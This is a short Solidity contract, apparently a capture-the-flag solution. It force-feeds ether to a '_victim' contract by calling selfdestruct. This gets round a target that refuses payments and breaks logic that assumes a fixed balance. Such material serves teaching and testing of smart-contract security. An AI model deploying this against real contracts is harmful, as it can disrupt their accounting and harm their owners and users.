// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Forcer {
    function force(address payable _victim) public payable {
        selfdestruct(_victim);
    }

    receive() external payable {}
}